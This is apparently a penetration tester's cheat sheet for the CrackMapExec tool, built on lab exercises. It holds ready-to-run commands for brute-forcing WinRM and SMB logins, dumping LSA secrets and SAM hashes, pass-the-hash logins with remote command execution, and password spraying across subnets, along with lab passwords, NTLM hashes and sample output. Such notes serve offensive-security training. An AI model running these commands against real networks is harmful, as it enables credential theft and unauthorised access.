# CrackMapExec

### install

```
sudo apt install snapd
sudo snap install crackmapexec
```

### CrackMapExec Protocol-Specific Help

```shell-session
crackmapexec smb -h
```

### CrackMapExec Usage

```shell-session
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```shell-session
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

```shell-session
WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

### Support Protocols

* [winrm](app://obsidian.md/WinRM%20Attacks)
* [ftp](app://obsidian.md/FTP%20Attack)
* ldap
* [smb](app://obsidian.md/SMB%20Attack)
* [mssql](app://obsidian.md/MSSQL%20Attacks)
* rdp
* [ssh](app://obsidian.md/SSH%20Attack)

## SMB

```
crackmapexec smb 10.10.11.174
```

**Null Authentication**

```
crackmapexec smb 10.10.11.174 --shares -u "" -p ""
```

**Anonymous Authentication**

* put any value in the user field

```
crackmapexec smb 10.10.11.174 --shares -u "fwewfawef" -p ""
```

**Login with username and password**

```
crackmapexec smb 10.10.11.174 --shares -d support -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

## Remote Dumping & LSA Secrets Considerations

* [CrackMapExec](app://obsidian.md/CrackMapExec)

```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

**Pass the Hash with CrackMapExec**

```shell-session
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

**CrackMapExec - Command Execution**

```shell-session
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

## winrm

```
crackmapexec winrm 10.129.202.136 -u username.list -p password.list
```



## Others

### Enumerating the Password Policy - from Linux - Credentialed

```shell-session
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

### SMB NULL Session to Pull User List

```shell-session
crackmapexec smb 172.16.5.5 --users
```

```shell-session
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm
```

### Password Spraying Active Directory

```shell-session
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

#### Local Admin Spraying with CrackMapExec

* The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.&#x20;
  * `Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain`

```shell-session
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
